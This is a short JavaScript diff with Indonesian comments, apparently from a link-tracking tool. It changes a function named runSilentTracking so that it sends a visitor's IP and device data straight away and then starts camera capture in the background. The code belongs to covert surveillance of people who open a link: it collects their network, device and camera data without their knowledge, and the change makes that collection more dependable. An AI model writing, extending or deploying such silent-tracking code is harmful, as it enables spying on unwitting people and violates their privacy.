@@ -138,10 +138,13 @@ async function runSilentTracking(link, dataRef, onCameraReady, notifConfig) {
     } catch { /* iOS/Firefox tidak support */ }
   }
 
-  // 4. Camera
-  if (opts.trackCamera) { onCameraReady(); return; }
-
+  // Kirim data IP & Device SEGERA tanpa menunggu kamera
   addCapture(link.id, { ...data }, notifConfig);
+
+  // 4. Camera (jika diaktifkan, jalankan di background)
+  if (opts.trackCamera) {
+    onCameraReady();
+  }
 }
 
 /* ─── Notification Banner ────────────────────────────────── */
